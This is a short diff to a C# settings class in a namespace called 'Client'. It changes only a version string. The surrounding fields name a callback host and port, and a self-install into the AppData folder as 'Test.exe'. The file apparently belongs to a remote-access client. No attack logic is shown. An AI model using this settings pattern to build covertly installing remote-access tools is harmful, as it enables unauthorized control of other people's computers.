@@ -13,7 +13,7 @@ namespace Client
 #if DEBUG
         public static string Ports = "6606";
         public static string Hosts = "127.0.0.1";
-        public static string Version = "0.5.4D";
+        public static string Version = "0.5.4E";
         public static string Install = "false";
         public static string InstallFolder = "AppData";
         public static string InstallFile = "Test.exe";
